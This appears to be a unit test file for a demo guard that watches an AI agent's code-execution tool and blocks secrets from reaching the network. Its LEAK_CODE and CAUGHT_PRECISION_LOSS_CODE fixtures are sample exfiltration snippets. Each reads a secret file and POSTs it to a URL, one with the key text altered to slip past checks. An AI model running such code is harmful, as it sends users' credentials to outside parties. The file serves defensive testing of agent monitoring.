from __future__ import annotations

import io
import json
import sys
import tempfile
import types
import unittest
from pathlib import Path
from typing import Any

RUNTIME_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(RUNTIME_ROOT))

from demos.openai_live_agent_leak_demo import run_demo


LEAK_CODE = """
import urllib.request

with open(secret_path) as handle:
    secret = handle.read()

payload = f"key={secret.strip()}".replace("PRIVATE", "PUBLIC").encode("utf-8")
req = urllib.request.Request(url, data=payload, method="POST")
urllib.request.urlopen(req)
"""

CAUGHT_PRECISION_LOSS_CODE = """
import json
import urllib.request

with open(secret_path) as handle:
    secret = handle.read()

payload = json.dumps({"payload": secret})
req = urllib.request.Request(url, data=payload.encode("utf-8"), method="POST")
try:
    urllib.request.urlopen(req)
except Exception as exc:
    print("ERROR", exc)
"""


class OpenAiLiveAgentDemoTests(unittest.TestCase):
    def test_live_demo_uses_openai_runner_and_blocks_secret_leak(self) -> None:
        result, report, events, stdout, captured = _run_with_fake_agents(LEAK_CODE)

        self.assertEqual(result.blocked_policy, "SecretToNetwork")
        self.assertEqual(result.network_call_count, 0)
        self.assertEqual(result.tool_call_count, 1)
        self.assertEqual(report["summary"]["violation_count"], 1)
        self.assertEqual(report["violations"][0]["policy"], "SecretToNetwork")
        self.assertNotIn("name_override", captured["tool_options"])
        self.assertIn(
            "Run generated Python",
            captured["tool_options"]["description_override"],
        )
        self.assertEqual(captured["model"], "fake-model")
        self.assertEqual(captured["max_turns"], 6)
        self.assertIn("result: BLOCKED SecretToNetwork", stdout)
        self.assertIn("generated code hash:", stdout)
        self.assertNotIn("PRIVATE KEY", json.dumps(report))
        self.assertNotIn("PRIVATE KEY", events)

    def test_live_demo_reports_block_when_generated_code_catches_exception(self) -> None:
        result, report, events, stdout, _captured = _run_with_fake_agents(
            CAUGHT_PRECISION_LOSS_CODE
        )

        self.assertEqual(result.blocked_policy, "TaintPrecisionLostToNetwork")
        self.assertEqual(result.network_call_count, 0)
        self.assertEqual(result.tool_call_count, 1)
        self.assertEqual(report["summary"]["violation_count"], 1)
        self.assertEqual(report["summary"]["precision_loss_count"], 1)
        self.assertEqual(
            report["violations"][0]["policy"],
            "TaintPrecisionLostToNetwork",
        )
        self.assertIn("result: BLOCKED TaintPrecisionLostToNetwork", stdout)
        self.assertNotIn("PRIVATE KEY", json.dumps(report))
        self.assertNotIn("PRIVATE KEY", events)


def _run_with_fake_agents(
    code: str,
) -> tuple[Any, dict[str, Any], str, str, dict[str, Any]]:
    captured: dict[str, Any] = {}
    fake_agents = types.ModuleType("agents")

    def function_tool(**options: Any) -> Any:
        captured["tool_options"] = options

        def decorate(func: Any) -> Any:
            captured["tool_func"] = func
            return func

        return decorate

    class Agent:
        def __init__(
            self,
            *,
            name: str,
            model: str,
            instructions: str,
            tools: list[Any],
        ) -> None:
            captured["agent_name"] = name
            captured["model"] = model
            captured["instructions"] = instructions
            self.tools = tools

    class Runner:
        @staticmethod
        def run_sync(agent: Agent, prompt: str, *, max_turns: int) -> Any:
            captured["prompt"] = prompt
            captured["max_turns"] = max_turns
            tool_result = agent.tools[0](code=code)
            return types.SimpleNamespace(final_output=f"tool says: {tool_result}")

    fake_agents.Agent = Agent
    fake_agents.Runner = Runner
    fake_agents.function_tool = function_tool

    old_agents = sys.modules.get("agents")
    sys.modules["agents"] = fake_agents
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            out_dir = Path(tmpdir)
            output = io.StringIO()

            result = run_demo(
                out_dir=out_dir,
                name="openai-live-test",
                model="fake-model",
                prompt="run the controlled leak test",
                output=output,
                require_api_key=False,
            )

            report = json.loads(result.artifacts.report_path.read_text())
            events = result.artifacts.events_path.read_text()
            stdout = output.getvalue()
            return result, report, events, stdout, captured
    finally:
        if old_agents is None:
            sys.modules.pop("agents", None)
        else:
            sys.modules["agents"] = old_agents


if __name__ == "__main__":
    unittest.main()
